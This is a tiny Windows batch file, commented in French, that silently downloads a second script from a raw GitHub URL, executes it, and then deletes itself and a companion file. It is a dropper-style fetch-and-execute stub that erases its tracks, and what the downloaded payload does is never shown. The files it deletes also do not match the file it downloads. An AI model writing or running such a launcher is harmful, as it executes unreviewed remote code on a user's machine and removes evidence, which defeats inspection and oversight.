@echo off

REM Télécharge le script secondaire
curl -s -o script.bat https://raw.githubusercontent.com/Goldo1236/test-curl/main/script.bat

REM Exécute le script secondaire
call script.bat

REM Supprime les deux scripts
del main.bat
del script2.bat
